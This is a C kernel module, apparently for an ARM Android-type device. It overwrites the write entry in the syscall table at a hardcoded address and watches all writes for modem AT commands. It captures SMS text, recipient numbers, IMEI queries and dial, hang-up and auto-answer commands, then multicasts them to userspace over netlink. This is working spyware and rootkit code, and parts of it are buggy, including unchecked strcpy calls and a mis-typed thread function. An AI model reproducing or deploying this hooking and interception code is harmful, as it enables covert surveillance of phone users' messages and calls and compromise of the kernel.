#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/kthread.h>
#include <net/sock.h>
#include <net/netlink.h>
#include <linux/skbuff.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");

//static void **sys_call_table;
#define SYS_CALL_TB 0xc000da84
#define SMS "AT+CMGS"
#define MY_GROUP 1
#define MAX_SIZE 1024
#define MODEL "AT+CMGF"
#define IMEI "AT+CGSN"
#define DIAL "ATD"
#define HANGUP "ATH"
#define AWCALL "ATA"
#define AUTOAW "ATS0"

unsigned long *sys_call_table = (unsigned long *)SYS_CALL_TB;
int (*orig_write)(unsigned int fd, char *buf, unsigned int count);
int (*orig_open)(const char *file, int flag, mode_t mode);
unsigned long i_sms_len = 0;
unsigned int sms_model = 0;
char textno[32] = {0};

struct task_struct *mythread = NULL;
struct sock *nl_sk = NULL;

//void kernel_send_nl_msg(const char *);

static void nl_receive_callback (struct sk_buff *skb)
{
    nlmsg_free(skb);
}

static void kernel_send_nl_msg(const char *msg)
{
    struct nlmsghdr *nlsk_mh;
    struct sk_buff* socket_buff;
    
    socket_buff = nlmsg_new(MAX_SIZE, GFP_KERNEL);

    nlsk_mh = nlmsg_put(socket_buff, 0, 0, NLMSG_DONE, MAX_SIZE, 0);

    NETLINK_CB(socket_buff).pid = 0;
    NETLINK_CB(socket_buff).dst_group = MY_GROUP;

    strcpy(nlmsg_data(nlsk_mh), msg);

    nlmsg_multicast(nl_sk, socket_buff, 0, MY_GROUP, GFP_KERNEL);

    return;
}

/*void get_sys_call_table() {
	void *swi_addr = (long*)0xffff0008;
	unsigned long offset = 0;
	unsigned long *vector_swi_addr = 0;
	unsigned long sys_call_table = 0;
	
	offset = ((*(long *)swi_addr)&0xfff) + 8;
	vector_swi_addr = *(unsigned long *)(swi_addr + offset);

	while (vector_swi_addr++) {
		if (((*(unsigned long *)vector_swi_addr) &
		0xfffff000) == 0xe28f8000) {
			offset = ((*(unsigned long *)vector_swi_addr) &
			0xfff) + 8;
			sys_call_table = (void *)vector_swi_addr + offset;
			break;
		}
	}
	return;
}*/

int new_open(const char *file, int flag, mode_t mode)
{
	
}

int new_write(unsigned int fd, char *buf, unsigned int count)
{
	if (sms_model == 0 && (i_sms_len * 2 + 2) == strlen(buf))
	{
		char msg[512] = {0};
		snprintf(msg, 512, "{'smsObject':['len':'%ld', 'sms':'%s', 'model': '0']}\n", i_sms_len, buf);
		printk(msg);
		kernel_send_nl_msg(strim(msg));
		i_sms_len = 0;
	}
	if (strstr(buf, MODEL))
	{
		char c_sms[127] = {0};
		char *p_sms = c_sms;
		strcpy(p_sms, buf);
		strsep(&p_sms, "=");
		kstrtol(p_sms, 0, &sms_model);
	}
	if (strstr(buf, SMS))
	{
		char c_sms[127] = {0};
		char *p_sms = c_sms;
		strcpy(p_sms, buf);
		strsep(&p_sms, "=");
		if (sms_model == 0)
		{
			kstrtol(p_sms, 0, &i_sms_len);
			//printk("AT Command->%s\n", buf);
		}
		else
		{
			strncpy(textno, p_sms, 32);
			char msg[512] = {0};
			snprintf(msg, 512, "{'smsObject':['len':'%d', 'sms':'%s', 'model': '1']}\n", strlen(buf), buf);
			printk(msg);
			kernel_send_nl_msg(strim(msg));
		}
	}
	if (strstr(buf, IMEI))
	{
		char msg[32] = {0};
		snprintf(msg, 32, "{'imeiObject':['cmd':'%s']}\n", buf);
		printk(msg);
		kernel_send_nl_msg(strim(msg));
	}
	if (strstr(buf, DIAL)
		|| strstr(buf, HANGUP) 
		|| strstr(buf, AWCALL)
		|| strstr(buf, AUTOAW))
	{
		char msg[32] = {0};
		snprintf(msg, 32, "{'dialObject':['cmd':'%s']}\n", buf);
		printk(msg);
		kernel_send_nl_msg(strim(msg));
	}
	
	return orig_write(fd, buf, count);
}

int init_module(void)
{
	//get_sys_call_table();
	orig_write = sys_call_table[__NR_write];
	sys_call_table[__NR_write] = &new_write;
	nl_sk = netlink_kernel_create(&init_net, NETLINK_USERSOCK, 0, nl_receive_callback, NULL, THIS_MODULE);
	if(!nl_sk)
	{
        printk(KERN_ERR "my_net_link: create netlink socket error.\n");
        return 1;
    }
	mythread = kthread_run(kernel_send_nl_msg, "init", "kernel_monitor");
	printk("module_write module ready!");
	return 0;
}

void cleanup_module(void)
{
	sys_call_table[__NR_write] = orig_write;
	if(nl_sk != NULL)
	{
        sock_release(nl_sk->sk_socket);
	}
	printk("remove module success!");
}
